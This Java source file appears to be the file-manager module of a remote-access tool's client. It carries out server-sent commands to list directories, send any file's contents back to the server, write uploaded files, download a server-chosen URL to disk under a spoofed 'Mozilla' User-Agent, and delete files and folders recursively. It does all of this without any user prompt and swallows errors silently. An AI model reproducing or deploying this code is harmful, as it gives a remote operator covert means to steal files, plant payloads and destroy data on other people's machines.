package me.kutuzov.client;

import me.kutuzov.entry.SerializableEntry;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.kftp.*;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Map;

public class KutuzovKFTPPackets {
    private static SerializableEntry<String, Long>[] buildEntry(SerializableEntry<String, Long>... entry) { return entry; }

    private static String directory = "";
    private static void sendList(ObjectInputStream ois, ObjectOutputStream oos, String directory) {
        File file = new File(directory);
        String[] directories = file.list((current, name) -> new File(current, name).isDirectory());
        String[] files = file.list((current, name) -> new File(current, name).isFile());
        ArrayList<SerializableEntry<String, Long>> entries = new ArrayList<>();
        for(String fileString : files) {
            String actualFile = Paths.get(directory, fileString).toString();

            try {
                entries.add(new SerializableEntry<>(fileString, Files.size(Paths.get(actualFile))));
            } catch (Exception e) {
                entries.add(new SerializableEntry<>(fileString, -1L));
            }
        }

        try {
            oos.writeObject(new CSKFTPDirectoryInfoPacket(directory, directories, entries.toArray(buildEntry())));
        } catch (Exception e) { }
    }

    private static void deleteDir(File file) {
        File[] contents = file.listFiles();
        if (contents != null)
            for (File f : contents)
                if (! Files.isSymbolicLink(f.toPath()))
                    deleteDir(f);
        file.delete();
    }

    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCKFTPHandshakePacket) {
            directory = System.getProperty("user.dir");
            sendList(ois, oos, directory);
        } else if(packet instanceof SCKFTPListDirectoryPacket) {
            SCKFTPListDirectoryPacket listDirectoryPacket = (SCKFTPListDirectoryPacket) packet;
            sendList(ois, oos, listDirectoryPacket.directory);
        } else if(packet instanceof SCKFTPChangeDirectoryPacket) {
            SCKFTPChangeDirectoryPacket changeDirectoryPacket = (SCKFTPChangeDirectoryPacket) packet;
            if(new File(changeDirectoryPacket.directory).isDirectory())
                directory = changeDirectoryPacket.directory;

            sendList(ois, oos, directory);
        } else if(packet instanceof SCKFTPDownloadFilePacket) {
            SCKFTPDownloadFilePacket downloadFilePacket = (SCKFTPDownloadFilePacket) packet;
            try {
                File file = new File(directory, downloadFilePacket.fileName);
                if(!file.exists() && file.isFile() && file.canRead()) {
                    oos.writeObject(new CSKFTPResponsePacket(CSKFTPResponsePacket.RESPONSE_ERROR));
                    return;
                }

                oos.writeObject(new CSKFTPResponsePacket(CSKFTPResponsePacket.RESPONSE_OK));

                byte[] bytes = Files.readAllBytes(Paths.get(file.getAbsolutePath()));
                oos.writeObject(new CSKFTPFilePacket(file.getPath(), bytes));
            } catch (Exception e) {
                try {
                    oos.writeObject(new CSKFTPFilePacket("", new byte[]{}));
                } catch (Exception e1) { }
            }
        } else if(packet instanceof SCKFTPStartUploadPacket) {
            try {
                oos.writeObject(new CSKFTPResponsePacket(CSKFTPResponsePacket.RESPONSE_OK));
            } catch (Exception e) { }
        } else if(packet instanceof SCKFTPFilePacket) {
            SCKFTPFilePacket filePacket = (SCKFTPFilePacket) packet;
            try {
                FileOutputStream fos = new FileOutputStream(Paths.get(directory, filePacket.path).toFile());
                fos.write(filePacket.data);
                fos.close();
            } catch (Exception e) { }
        } else if(packet instanceof SCKFTPUploadUrlPacket) {
            SCKFTPUploadUrlPacket uploadUrlPacket = (SCKFTPUploadUrlPacket) packet;
            try {
                URL url = new URL(uploadUrlPacket.url);
                URLConnection connection = url.openConnection();
                connection.addRequestProperty("User-Agent", "Mozilla");
                connection.setConnectTimeout(20000);
                connection.setReadTimeout(120000);

                InputStream is = connection.getInputStream();
                Files.copy(is, Paths.get(directory, uploadUrlPacket.path), StandardCopyOption.REPLACE_EXISTING);
                is.close();
            } catch (Exception e) { }
        } else if(packet instanceof SCKFTPCreateDirectoryPacket) {
            SCKFTPCreateDirectoryPacket createDirectoryPacket = (SCKFTPCreateDirectoryPacket) packet;
            File file = new File(directory, createDirectoryPacket.directory);
            if(!file.exists())
                file.mkdir();
        } else if(packet instanceof SCKFTPDeleteDirectoryPacket) {
            SCKFTPDeleteDirectoryPacket deleteDirectoryPacket = (SCKFTPDeleteDirectoryPacket) packet;
            File file = new File(directory, deleteDirectoryPacket.path);
            if(file.exists())
                deleteDir(file);
        } else if(packet instanceof SCKFTPDeleteFilePacket) {
            SCKFTPDeleteFilePacket deleteFilePacket = (SCKFTPDeleteFilePacket) packet;
            File file = new File(directory, deleteFilePacket.path);
            if(file.exists())
                file.delete();
        } else if(packet instanceof SCKFTPStateFilePacket) {
            SCKFTPStateFilePacket stateFilePacket = (SCKFTPStateFilePacket) packet;
            File file = new File(stateFilePacket.path);
            try {
                oos.writeObject(new CSKFTPStateFilePacket(stateFilePacket.path, file.exists() && file.isFile()));
            } catch (Exception exception) {}
        }
    }
}